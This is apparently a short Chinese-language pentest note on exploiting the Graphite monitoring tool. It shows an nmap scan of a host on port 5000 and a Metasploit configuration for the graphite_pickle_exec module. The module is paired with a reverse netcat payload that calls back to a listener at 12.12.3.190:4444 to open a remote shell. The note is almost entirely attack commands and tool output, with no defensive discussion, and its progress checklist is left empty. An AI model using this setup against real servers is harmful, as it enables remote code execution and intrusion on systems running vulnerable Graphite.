---
title: Graphite
encrypt: false
enc_pwd: askding
categories:
  - Kali
  - Exploit
date: 2020-12-17 17:05:35
top:
tags:
layout:
---
编写进度
- [x] 

`Graphite` 是一个企业级开源系统的实时监控绘图工具,采用Django框架编写，可实时收集、存储、显示时间序列类型的数据。


## information
```
nmap -T4 -sV -Pn -p 5000 10.199.56.1
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-17 17:14 CST
Nmap scan report for 10.199.56.1
Host is up (0.088s latency).

PORT     STATE SERVICE VERSION
5000/tcp open  upnp?
1 service unrecognized despite returning data.
```

## MSF相关利用
```zsh
Module options (exploit/unix/webapp/graphite_pickle_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.199.56.1      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      5000             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The path to a vulnerable application
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  12.12.3.190      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
```

